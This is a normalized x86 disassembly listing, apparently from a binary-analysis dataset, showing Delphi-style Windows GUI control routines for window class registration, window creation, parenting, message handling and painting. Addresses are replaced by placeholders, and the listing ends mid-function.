call sub_44e148
jmp r-xdata
mov [ ebx + 0x30 ] esi
sub_452bb0
push ebx
push esi
mov ebx edx
mov esi eax
mov eax ebx
mov edx [ r-xdata ]
call sub_40343c
test al al
je r-xdata
lea eax [ esi + 0x198 ]
mov edx ebx
call sub_44e170
lea eax [ esi + 0x194 ]
mov edx ebx
call sub_44e170
lea eax [ esi + 0x19c ]
mov edx ebx
call sub_44e170
jmp r-xdata
xor eax eax
mov [ ebx + 0x30 ] eax
pop esi
pop ebx
retn
sub_452bf8
push ebx
push esi
push edi
mov ebx edx
mov edi eax
mov edx edi
mov eax ebx
mov si 0xfff5
call sub_4034ac
push 0x1
mov esi ebx
mov ecx esi
mov edx 0xb02c
mov eax edi
call sub_450a20
mov edx ebx
mov eax edi
call sub_452b64
test [ ebx + 0x1c ] 0x2
jne r-xdata
push 0x1
mov ecx esi
mov edx 0xb036
mov eax edi
call sub_450a20
pop edi
pop esi
pop ebx
retn
push 0x0
xor ecx ecx
mov edx 0xb009
mov eax ebx
call sub_450a20
push 0x0
xor ecx ecx
mov edx 0xb008
mov eax ebx
call sub_450a20
push 0x0
xor ecx ecx
mov edx 0xb023
mov eax ebx
call sub_450a20
push 0x0
xor ecx ecx
mov edx 0xb03d
mov eax ebx
call sub_450a20
mov eax ebx
mov edx [ r-xdata ]
call sub_40343c
test al al
je r-xdata
mov eax edi
call sub_456358
test al al
je r-xdata
push 0x0
xor ecx ecx
mov edx 0xb011
mov eax ebx
call sub_450a20
mov eax edi
call sub_453748
jmp r-xdata
mov edx ebx
mov eax edi
call sub_452858
mov eax ebx
mov edx [ eax ]
call [ edx + 0x7c ]
sub_452ccc
push ebx
push esi
push edi
push ebp
mov ebx edx
mov esi eax
push 0x0
mov edi ebx
mov ecx edi
mov edx 0xb036
mov eax esi
call sub_450a20
mov eax ebx
mov edx [ r-xdata ]
call sub_40343c
test al al
je r-xdata
mov eax esi
call sub_456358
test al al
je r-xdata
mov dl 0x1
mov ebp ebx
mov eax ebp
call sub_452b44
mov eax ebp
call sub_4535ac
jmp r-xdata
mov edx ebx
mov eax esi
call sub_452bb0
push 0x0
mov ecx edi
mov edx 0xb02c
mov eax esi
call sub_450a20
mov eax esi
call sub_452914
pop ebp
pop edi
pop esi
pop ebx
retn
xor ecx ecx
mov dl [ ebx + 0x57 ]
mov eax ebx
call sub_44fc9c
sub_452d48
push ebx
push esi
push edi
push ebp
mov edi edx
mov ebx eax
mov ebp [ ebx + 0x198 ]
test ebp ebp
je r-xdata
xor esi esi
mov esi [ ebp + 0x8 ]
jmp r-xdata
mov edx edi
sub edx esi
mov eax [ ebx + 0x19c ]
call sub_4189b0
mov edx edi
mov eax ebp
call sub_4189b0
jmp r-xdata
cmp esi edi
jle r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
sub_452da4
push ebx
push esi
push edi
push ebp
push ecx
mov esi edx
mov [ esp ] eax
mov eax [ esp ]
call sub_452d84
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
inc ebx
xor edi edi
inc edi
dec ebx
jne r-xdata
mov edx edi
mov eax [ esp ]
call sub_452d48
mov ebp eax
mov edx esi
mov eax [ ebp + 0x3c ]
call [ ebp + 0x38 ]
cmp [ esi + 0xc ] 0x0
jne r-xdata
sub_452de4
add esp 0xfffffff0
movzx edx dx
mov [ esp ] edx
xor edx edx
mov [ esp + 0x4 ] edx
xor edx edx
mov [ esp + 0x8 ] edx
xor edx edx
mov [ esp + 0xc ] edx
mov edx esp
call sub_452da4
add esp 0x10
retn
sub_452e0c
push ebx
push esi
push edi
mov esi ecx
mov ebx edx
test esi esi
je r-xdata
pop edi
pop esi
pop ebx
retn
mov edi [ ebx + 0x34 ]
lea eax [ ebx + 0x24 ]
push eax
push esi
mov eax [ rw-data ]
push eax
call GetClassInfoA
test eax eax
jne r-xdata
mov [ ebx + 0x34 ] edi
mov eax [ ebx + 0x24 ]
and eax 0xffffbf1f
or eax 0x3
mov [ ebx + 0x24 ] eax
lea eax [ ebx + 0x24 ]
push eax
push esi
push 0x0
call GetClassInfoA
test eax eax
jne r-xdata
lea eax [ ebx + 0x24 ]
push eax
push esi
mov eax [ rw-data ]
mov eax [ eax ]
push eax
call GetClassInfoA
test eax eax
jne r-xdata
lea eax [ ebx + 0x24 ]
push eax
push esi
mov eax [ ebx + 0x34 ]
push eax
call GetClassInfoA
sub_452e78
push ebx
push esi
push edi
mov edi edx
mov ebx eax
mov eax ebx
call sub_44feb0
test al al
je r-xdata
mov eax ebx
call sub_44fee0
test al al
je r-xdata
or [ edi ] 0x2000
mov eax ebx
mov si 0xffc8
call sub_4034ac
test al al
je r-xdata
or [ edi ] 0x4000
pop edi
pop esi
pop ebx
retn
mov eax ebx
mov si 0xffca
call sub_4034ac
test al al
jne r-xdata
mov eax ebx
mov si 0xffca
call sub_4034ac
cmp al 0x1
jne r-xdata
or [ edi ] 0x1000
jmp r-xdata
or [ edi ] 0x0
sub_452ee0
push ebp
mov ebp esp
add esp 0xfffffefc
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x4 ] ecx
mov ebx edx
mov esi eax
xor eax eax
push ebp
push sub_452ffe
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
xor ecx ecx
mov edx 0x8c
call sub_402cc4
mov eax [ esi + 0x64 ]
mov [ ebx ] eax
mov [ ebx + 0x4 ] 0x44000000
lea edx [ ebx + 0x8 ]
mov eax esi
call sub_452e78
test [ esi + 0x50 ] 0x1
je r-xdata
test [ esi + 0x1c ] 0x10
jne r-xdata
or [ ebx + 0x4 ] 0x2000000
or [ ebx + 0x8 ] 0x10000
cmp [ esi + 0x1a4 ] 0x0
je r-xdata
mov eax esi
mov edx [ eax ]
call [ edx + 0x50 ]
test al al
jne r-xdata
mov eax [ esi + 0x40 ]
mov [ ebx + 0xc ] eax
mov eax [ esi + 0x44 ]
mov [ ebx + 0x10 ] eax
mov eax [ esi + 0x48 ]
mov [ ebx + 0x14 ] eax
mov eax [ esi + 0x4c ]
mov [ ebx + 0x18 ] eax
mov edi [ esi + 0x30 ]
test edi edi
je r-xdata
or [ ebx + 0x4 ] 0x10000
or [ ebx + 0x4 ] 0x8000000
mov eax [ esi + 0x190 ]
mov [ ebx + 0x1c ] eax
mov eax edi
call sub_456054
mov [ ebx + 0x1c ] eax
jmp r-xdata
mov [ ebx + 0x24 ] 0xb
mov eax DefWindowProcA
mov [ ebx + 0x28 ] eax
push 0x7f00
push 0x0
call LoadCursorA
mov [ ebx + 0x3c ] eax
xor eax eax
mov [ ebx + 0x40 ] eax
mov eax [ rw-data ]
mov [ ebx + 0x34 ] eax
lea edx [ ebp - 0x104 ]
mov eax [ esi ]
call sub_403200
lea edx [ ebp - 0x104 ]
lea eax [ ebp - 0x4 ]
call sub_404310
mov edx [ ebp - 0x4 ]
lea eax [ ebx + 0x4c ]
call sub_4089a0
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_453005
lea eax [ ebp - 0x4 ]
call sub_4040ac
retn
sub_45300c
push ebp
mov ebp esp
add esp 0xffffff40
push ebx
push esi
xor edx edx
mov [ ebp - 0xc0 ] edx
mov esi eax
xor eax eax
push ebp
push sub_4531cd
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x8c ]
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x98 ]
cmp [ ebp - 0x70 ] 0x0
jne r-xdata
mov eax [ ebp - 0x64 ]
mov [ esi + 0x174 ] eax
lea eax [ ebp - 0xb4 ]
push eax
lea eax [ ebp - 0x40 ]
push eax
mov eax [ ebp - 0x58 ]
push eax
call GetClassInfoA
cmp eax 0x1
sbb eax eax
inc eax
test al al
je r-xdata
test [ ebp - 0x85 ] 0x40
je r-xdata
test al al
je r-xdata
mov edx sub_44c648
cmp edx [ ebp - 0xb0 ]
je r-xdata
mov ebx [ esi + 0x4 ]
test ebx ebx
je r-xdata
mov [ ebp - 0x64 ] sub_44c648
lea eax [ ebp - 0x40 ]
mov [ ebp - 0x44 ] eax
lea eax [ ebp - 0x68 ]
push eax
call RegisterClassA
test ax ax
jne r-xdata
mov eax [ ebp - 0x58 ]
push eax
lea eax [ ebp - 0x40 ]
push eax
call UnregisterClassA
mov [ rw-data ] esi
lea edx [ ebp - 0x8c ]
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x9c ]
cmp [ esi + 0x180 ] 0x0
jne r-xdata
mov eax [ esi + 0x8 ]
mov [ ebp - 0xbc ] eax
mov [ ebp - 0xb8 ] 0xb
lea eax [ ebp - 0xbc ]
push eax
push 0x0
lea edx [ ebp - 0xc0 ]
mov eax [ rw-data ]
call sub_405e08
mov ecx [ ebp - 0xc0 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40bb18
call sub_403a64
test [ ebx + 0x1c ] 0x2
je r-xdata
call sub_40d008
push 0xfffffff0
mov eax [ esi + 0x180 ]
push eax
call GetWindowLongA
test eax 0x40000000
je r-xdata
call sub_40d008
mov eax ebx
mov edx [ r-xdata ]
call sub_40343c
test al al
je r-xdata
mov eax [ esi + 0x64 ]
call sub_408b54
xor eax eax
mov [ esi + 0x64 ] eax
mov eax esi
call sub_456364
push 0x1
mov eax [ esi + 0x68 ]
call sub_424408
mov ecx eax
mov edx 0x30
mov eax esi
call sub_450a20
cmp [ esi + 0x5c ] 0x0
je r-xdata
push 0xfffffff4
mov eax [ esi + 0x180 ]
push eax
call GetWindowLongA
test eax eax
jne r-xdata
mov eax ebx
call sub_456054
mov [ ebp - 0x70 ] eax
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4531d4
lea eax [ ebp - 0xc0 ]
call sub_4040ac
retn
mov eax esi
mov si 0xffee
call sub_4034ac
mov eax [ esi + 0x180 ]
push eax
push 0xfffffff4
push eax
call SetWindowLongA
sub_4531dc
push ebx
push esi
mov ebx edx
mov esi eax
mov eax [ ebx + 0x4 ]
push eax
mov eax [ ebx + 0xc ]
push eax
mov eax [ ebx + 0x10 ]
push eax
mov eax [ ebx + 0x14 ]
push eax
mov eax [ ebx + 0x18 ]
push eax
mov eax [ ebx + 0x1c ]
push eax
push 0x0
mov eax [ ebx + 0x34 ]
push eax
mov eax [ ebx + 0x20 ]
push eax
mov ecx [ ebx ]
lea edx [ ebx + 0x4c ]
mov eax [ ebx + 0x8 ]
call sub_406d20
mov [ esi + 0x180 ] eax
pop esi
pop ebx
retn
sub_45321c
push ebx
push esi
mov esi edx
mov ebx eax
mov eax esi
call sub_41d0bc
mov eax esi
call sub_41d00c
mov [ ebx + 0x1fa ] eax
mov eax esi
call sub_41d00c
mov [ ebx + 0x1fe ] eax
or [ ebx + 0x98 ] 0x20
mov eax esi
call sub_41d0c4
pop esi
pop ebx
retn
sub_453254
push ebx
push esi
add esp 0xfffffff0
mov esi edx
mov ebx eax
mov edx esp
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x44 ]
mov eax [ esp + 0x8 ]
mov [ ebx + 0x1fa ] eax
mov eax [ esp + 0xc ]
mov [ ebx + 0x1fe ] eax
mov eax esi
call sub_41f2f0
mov edx [ ebx + 0x1fa ]
mov eax esi
call sub_41f224
mov edx [ ebx + 0x1fe ]
mov eax esi
call sub_41f224
mov eax esi
call sub_41f2f8
add esp 0x10
pop esi
pop ebx
retn
sub_4532bc
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x1 ] 0x1
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov ebx [ eax + 0x20 ]
test ebx ebx
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax + 0x198 ]
test eax eax
je r-xdata
mov eax [ ebp + 0x8 ]
lea edx [ ebx + 0x1fa ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
add eax 0x1fa
call sub_4532a8
test al al
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax + 0x19c ]
test eax eax
je r-xdata
mov edx [ ebp + 0x8 ]
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
mov [ ebp - 0x1 ] 0x0
mov edx [ ebp + 0x8 ]
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
inc ebx
xor esi esi
inc ebx
xor esi esi
inc esi
dec ebx
jne r-xdata
mov al [ r-xdata ]
cmp al [ edi + 0x61 ]
jne r-xdata
inc esi
dec ebx
jne r-xdata
mov al [ r-xdata ]
cmp al [ edi + 0x61 ]
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax + 0x198 ]
mov edx esi
call sub_4189b0
mov edi eax
cmp [ edi + 0x5b ] 0x0
jne r-xdata
mov al [ ebp - 0x1 ]
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax + 0x19c ]
mov edx esi
call sub_4189b0
mov edi eax
cmp [ edi + 0x5b ] 0x0
jne r-xdata
sub_453394
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
mov [ ebp - 0x4 ] edx
mov [ ebp - 0x8 ] eax
mov edx [ ebp - 0x4 ]
mov eax [ ebp - 0x8 ]
call sub_450d58
mov eax [ ebp - 0x8 ]
push eax
push sub_45321c
mov eax [ ebp - 0x8 ]
push eax
push sub_453254
push ebp
call sub_4532bc
pop ecx
mov ecx eax
mov edx r-xdata
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x4 ]
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_4533f0
push ebx
push esi
push edi
mov ebx eax
mov eax ebx
call sub_44f7c8
mov esi eax
cmp esi 0x1
jge r-xdata
lea eax [ esi + 0x1 ]
call sub_408b08
mov edi eax
mov [ ebx + 0x64 ] edi
mov eax edi
call sub_408b1c
mov ecx eax
mov edx edi
mov eax ebx
call sub_44f7d8
mov eax r-xdata
call sub_408b28
mov [ ebx + 0x64 ] eax
jmp r-xdata
call sub_44e27c
mov eax ebx
mov edx [ eax ]
call [ edx + 0xac ]
pop edi
pop esi
pop ebx
retn
sub_453448
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
or [ eax + 0x54 ] 0x200
xor eax eax
push ebp
push sub_453495
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x180 ]
push eax
call DestroyWindow
test eax eax
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45349c
mov eax [ ebp - 0x4 ]
and [ eax + 0x54 ] 0xfdff
retn
call sub_40d008
sub_4534ac
push ebx
push esi
push edi
mov ebx edx
mov edi eax
mov eax [ edi + 0x19c ]
mov edx ebx
call sub_418a0c
mov esi eax
inc esi
mov eax [ edi + 0x19c ]
mov ebx [ eax + 0x8 ]
dec ebx
sub ebx esi
jl r-xdata
xor eax eax
inc ebx
pop edi
pop esi
pop ebx
retn
inc esi
dec ebx
jne r-xdata
mov eax [ edi + 0x19c ]
mov edx esi
call sub_4189b0
mov eax [ eax + 0x180 ]
test eax eax
jne r-xdata
sub_4534f4
push ebx
push esi
push edi
mov ebx eax
cmp [ ebx + 0x180 ] 0x0
jne r-xdata
pop edi
pop esi
pop ebx
retn
mov eax ebx
mov edx [ eax ]
call [ edx + 0xa0 ]
mov esi ebx
push esi
movzx eax [ rw-data ]
push eax
mov eax [ ebx + 0x180 ]
push eax
call SetPropA
push esi
movzx eax [ rw-data ]
push eax
mov eax [ ebx + 0x180 ]
push eax
call SetPropA
mov esi [ ebx + 0x30 ]
test esi esi
je r-xdata
mov eax ebx
call sub_452d84
mov esi eax
dec esi
test esi esi
jl r-xdata
push 0x13
push 0x0
push 0x0
push 0x0
push 0x0
mov edx ebx
mov eax esi
call sub_4534ac
push eax
mov eax [ ebx + 0x180 ]
push eax
call SetWindowPos
inc esi
xor edi edi
mov edx edi
mov eax ebx
call sub_452d48
call sub_44eea8
inc edi
dec esi
jne r-xdata
sub_453590
push ebp
mov ebp esp
add esp 0xfffffff0
push esi
push edi
mov esi [ ebp + 0x8 ]
lea edi [ ebp - 0x10 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
pop edi
pop esi
mov esp ebp
pop ebp
retn 0x14
sub_4535ac
push ebx
push esi
push edi
mov ebx eax
cmp [ ebx + 0x180 ] 0x0
je r-xdata
pop edi
pop esi
pop ebx
retn
mov eax [ ebx + 0x19c ]
test eax eax
je r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0xb0 ]
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
inc esi
xor edi edi
mov edx edi
mov eax [ ebx + 0x19c ]
call sub_4189b0
call sub_4535ac
inc edi
dec esi
jne r-xdata
sub_45360c
push ebx
push esi
push edi
mov edi eax
mov eax edi
mov si 0xffb5
call sub_4034ac
mov ebx eax
mov eax edi
call sub_4535ac
mov eax edi
call sub_453748
test bl bl
je r-xdata
pop edi
pop esi
pop ebx
retn
cmp [ edi + 0x180 ] 0x0
je r-xdata
mov eax [ edi + 0x180 ]
push eax
call SetFocus
sub_45364c
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x57 ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
test [ eax + 0x54 ] 0x8
je r-xdata
mov eax [ ebp - 0x4 ]
test [ eax + 0x1c ] 0x10
je r-xdata
mov al 0x1
xor eax eax
jmp r-xdata
mov eax [ ebp - 0x4 ]
test [ eax + 0x51 ] 0x4
jne r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x180 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x180 ] 0x0
jne r-xdata
mov [ ebp - 0x5 ] al
cmp [ ebp - 0x5 ] 0x0
je r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
mov al [ eax + 0x1a6 ]
cmp al [ ebp - 0x5 ]
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x19c ]
test eax eax
je r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x94 ]
mov eax [ ebp - 0x4 ]
mov dl [ ebp - 0x5 ]
mov [ eax + 0x1a6 ] dl
xor eax eax
push ebp
push j_sub_403778#9
push [ fs : eax ]
mov [ fs : eax ] esp
push 0x0
xor ecx ecx
mov edx 0xb019
mov eax [ ebp - 0x4 ]
call sub_450a20
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
inc ebx
xor esi esi
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x19c ]
mov edx esi
call sub_4189b0
call sub_45364c
inc esi
dec ebx
jne r-xdata
sub_453748
push ebx
push esi
mov esi eax
mov ebx esi
jmp r-xdata
mov eax [ ebx + 0x30 ]
test eax eax
jne r-xdata
mov ebx eax
cmp [ ebx + 0x1a6 ] 0x0
je r-xdata
mov eax ebx
mov edx [ r-xdata ]
call sub_40343c
test al al
jne r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_45364c
cmp [ ebx + 0x190 ] 0x0
je r-xdata
sub_453788
push ebx
push esi
mov esi edx
mov ebx eax
cmp [ ebx + 0x30 ] 0x0
jne r-xdata
pop esi
pop ebx
retn
cmp esi [ ebx + 0x190 ]
je r-xdata
cmp [ ebx + 0x180 ] 0x0
je r-xdata
mov eax ebx
call sub_4535ac
mov [ ebx + 0x190 ] esi
cmp [ ebx + 0x190 ] 0x0
je r-xdata
test esi esi
je r-xdata
mov [ ebx + 0x190 ] esi
push esi
mov eax [ ebx + 0x180 ]
push eax
call SetParent
mov eax [ rw-data ]
cmp [ eax ] 0x5
jl r-xdata
mov eax ebx
call sub_453748
mov eax [ rw-data ]
cmp [ eax ] 0x2
jne r-xdata
push 0x0
mov dx 0x3
mov ax 0x3
call sub_406d08
mov ecx eax
mov edx 0x127
mov eax ebx
call sub_450a20
jmp r-xdata
sub_453810
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push j_sub_403778#8
push [ fs : eax ]
mov [ fs : eax ] esp
xor eax eax
push ebp
push sub_453857
push [ fs : eax ]
mov [ fs : eax ] esp
mov ebx [ ebp - 0x4 ]
mov eax [ ebx + 0x3c ]
call [ ebx + 0x38 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45385e
call sub_44e27c
call sub_426f7c
retn
sub_453888
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
mov ebx eax
lea ecx [ ebp - 0x8 ]
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x4 ]
mov edx [ edx + 0x4 ]
sub edx [ ebx + 0x44 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax ]
sub eax [ ebx + 0x40 ]
call sub_417330
mov eax [ ebp + 0x8 ]
mov edx [ ebp - 0x8 ]
mov [ eax - 0xc ] edx
mov edx [ ebp - 0x4 ]
mov [ eax - 0x8 ] edx
mov eax [ ebp + 0x8 ]
push [ eax - 0x8 ]
push [ eax - 0xc ]
lea edx [ ebp - 0x18 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x44 ]
lea eax [ ebp - 0x18 ]
push eax
call PtInRect
test eax eax
je r-xdata
xor eax eax
jmp r-xdata
test [ ebx + 0x1c ] 0x10
je r-xdata
test al al
je r-xdata
cmp [ ebx + 0x57 ] 0x0
je r-xdata
cmp [ ebx + 0x57 ] 0x0
jne r-xdata
pop ebx
mov esp ebp
pop ebp
retn
mov edx [ ebp + 0x8 ]
mov [ edx - 0x14 ] ebx
mov eax ebx
mov edx [ eax ]
call [ edx + 0x50 ]
test al al
jne r-xdata
mov al 0x1
test [ ebx + 0x51 ] 0x4
je r-xdata
mov eax [ ebp + 0x8 ]
add eax 0xfffffff4
call sub_406cf0
push eax
xor ecx ecx
mov edx 0xb00a
mov eax ebx
call sub_450a20
test eax eax
jne r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0xd ] 0x0
je r-xdata
sub_453940
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
push esi
mov [ ebp - 0xd ] cl
mov [ ebp - 0x4 ] edx
mov esi eax
xor eax eax
mov [ ebp - 0x14 ] eax
cmp [ ebp + 0x8 ] 0x0
je r-xdata
mov eax [ esi + 0x198 ]
test eax eax
je r-xdata
cmp [ esi + 0x19c ] 0x0
je r-xdata
mov eax [ ebp - 0x14 ]
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
cmp [ ebp - 0x14 ] 0x0
jne r-xdata
mov eax [ esi + 0x19c ]
mov ebx [ eax + 0x8 ]
dec ebx
cmp ebx 0x0
jl r-xdata
mov ebx [ eax + 0x8 ]
dec ebx
cmp ebx 0x0
jl r-xdata
push ebp
mov edx ebx
mov eax [ esi + 0x19c ]
call sub_4189b0
call sub_453888
pop ecx
test al al
jne r-xdata
push ebp
mov edx ebx
mov eax [ esi + 0x198 ]
call sub_4189b0
call sub_453888
pop ecx
test al al
jne r-xdata
dec ebx
cmp ebx 0xffffffff
jne r-xdata
dec ebx
cmp ebx 0xffffffff
jne r-xdata
sub_4539d4
push ebx
push esi
push edi
add esp 0xfffffff0
mov esi edx
mov ebx eax
mov eax ebx
call sub_456054
mov edi eax
call GetCapture
cmp edi eax
jne r-xdata
push 0x0
lea edx [ esp + 0xc ]
mov eax [ esi + 0x8 ]
call sub_406cdc
lea edx [ esp + 0xc ]
xor ecx ecx
mov eax ebx
call sub_453940
mov ebx eax
cmp [ rw-data ] 0x0
je r-xdata
add esp 0x10
pop edi
pop esi
pop ebx
retn
movsx eax [ esi + 0x8 ]
sub eax [ ebx + 0x40 ]
mov [ esp ] eax
movsx eax [ esi + 0xa ]
sub eax [ ebx + 0x44 ]
mov [ esp + 0x4 ] eax
mov eax esp
call sub_406cf0
push eax
mov ecx [ esi + 0x4 ]
mov edx [ esi ]
mov eax ebx
call sub_450a20
mov [ esi + 0xc ] eax
mov al 0x1
xor ebx ebx
jmp r-xdata
mov eax [ rw-data ]
cmp ebx [ eax + 0x30 ]
jne r-xdata
xor eax eax
test ebx ebx
je r-xdata
mov ebx [ rw-data ]
jmp r-xdata
sub_453a68
push ebx
push esi
push edi
add esp 0xfffffff0
mov esi edx
mov ebx eax
mov eax [ esi ]
cmp eax 0x84
jg r-xdata
add eax 0xffffff00
sub eax 0x9
jb r-xdata
je r-xdata
mov eax ebx
call sub_44ffdc
test al al
jne r-xdata
add eax 0xffffff09
sub eax 0xb
jb r-xdata
mov edx esi
mov eax ebx
call sub_450aec
cmp [ esi + 0xc ] 0xffffffff
jne r-xdata
sub eax 0x7
je r-xdata
add esp 0x10
pop edi
pop esi
pop ebx
retn
jmp r-xdata
mov edx esi
mov eax ebx
call sub_4539d4
test al al
je r-xdata
jmp r-xdata
push 0x0
lea edx [ esp + 0xc ]
mov eax [ esi + 0x8 ]
call sub_406cdc
lea edx [ esp + 0xc ]
lea ecx [ esp + 0x4 ]
mov eax ebx
call sub_44f398
lea edx [ esp + 0x4 ]
xor ecx ecx
mov eax ebx
call sub_453940
test eax eax
je r-xdata
mov eax ebx
call sub_466768
mov edi eax
test edi edi
je r-xdata
dec eax
je r-xdata
mov edx esi
mov eax ebx
call sub_450aec
cmp [ esi + 0xc ] 0x0
jne r-xdata
mov [ esi + 0xc ] 0x1
jmp r-xdata
mov edx ebx
mov eax edi
mov ecx [ eax ]
call [ ecx + 0xe8 ]
test al al
je r-xdata
test [ ebx + 0x54 ] 0x20
jne r-xdata
sub eax 0x17
je r-xdata
mov eax ebx
call sub_456358
test al al
je r-xdata
jmp r-xdata
jmp r-xdata
mov eax ebx
call sub_456054
mov edi eax
call GetCapture
cmp edi eax
jne r-xdata
jmp r-xdata
mov eax [ esi + 0x8 ]
push eax
mov eax [ esi + 0x4 ]
push eax
mov eax [ esi ]
push eax
mov eax ebx
call sub_456054
push eax
call DefWindowProcA
jmp r-xdata
cmp [ rw-data ] 0x0
je r-xdata
mov eax [ rw-data ]
cmp ebx [ eax + 0x30 ]
jne r-xdata
push 0x0
xor ecx ecx
mov edx 0x1f
mov eax [ rw-data ]
call sub_450a20
sub_453bcc
push ebx
push esi
push edi
push ebp
mov ebx edx
mov esi eax
cmp [ esi + 0x180 ] 0x0
je r-xdata
mov edx ebx
mov eax esi
call sub_450c80
mov edi [ ebx ]
cmp edi 0x7b
jne r-xdata
mov edi [ ebx ]
mov eax edi
add eax 0xfffffece
sub eax 0x7
jb r-xdata
cmp [ esi + 0x30 ] 0x0
je r-xdata
mov ebp [ ebx + 0x8 ]
push ebp
mov eax [ ebx + 0x4 ]
push eax
add edi 0xbc00
push edi
push ebp
call SendMessageA
mov [ ebx + 0xc ] eax
jmp r-xdata
add eax 0xffff4407
sub eax 0x7
jb r-xdata
mov eax [ ebx + 0x8 ]
push eax
mov ecx [ ebx + 0x4 ]
mov edx edi
mov eax [ esi + 0x30 ]
call sub_450a20
mov ebp eax
mov [ ebx + 0xc ] ebp
test ebp ebp
jne r-xdata
mov eax [ ebx ]
cmp eax 0xc
jne r-xdata
mov eax [ esi + 0x68 ]
mov eax [ eax + 0x18 ]
call sub_423f34
push eax
mov eax [ ebx + 0x4 ]
push eax
call SetTextColor
mov eax [ esi + 0x170 ]
call sub_424bb8
call sub_423f34
push eax
mov eax [ ebx + 0x4 ]
push eax
call SetBkColor
mov eax [ esi + 0x170 ]
call sub_424bf4
mov [ ebx + 0xc ] eax
jmp r-xdata
jmp r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
mov edx [ ebx + 0x8 ]
push edx
mov ecx [ ebx + 0x4 ]
mov edx eax
mov eax esi
call sub_44f3f4
jmp r-xdata
cmp edi [ rw-data ]
jne r-xdata
mov eax [ ebx + 0x8 ]
push eax
mov eax [ ebx + 0x4 ]
push eax
push edi
mov eax [ esi + 0x180 ]
push eax
mov eax [ esi + 0x174 ]
push eax
call CallWindowProcA
mov [ ebx + 0xc ] eax
mov [ ebx + 0xc ] esi
jmp r-xdata
sub_453cd4
push ebx
push esi
push edi
mov esi edx
xor ebx ebx
call sub_44c734
mov edi eax
test edi edi
je r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
retn
mov eax [ esi + 0x8 ]
push eax
mov ecx [ esi + 0x4 ]
mov edx [ esi ]
add edx 0xbc00
mov eax edi
call sub_450a20
mov [ esi + 0xc ] eax
mov bl 0x1
sub_453d08
push ebp
mov ebp esp
add esp 0xffffffb0
push ebx
push esi
push edi
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov ebx [ ebp - 0x8 ]
mov ebx [ ebx + 0x4 ]
test ebx ebx
jne r-xdata
xor edx edx
push ebp
push sub_453e28
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x198 ] 0x0
jne r-xdata
lea eax [ ebp - 0x50 ]
push eax
mov eax [ ebp - 0x4 ]
call sub_456054
push eax
call BeginPaint
mov ebx eax
push ebx
call SaveDC
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] 0x2
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x198 ]
mov edi [ eax + 0x8 ]
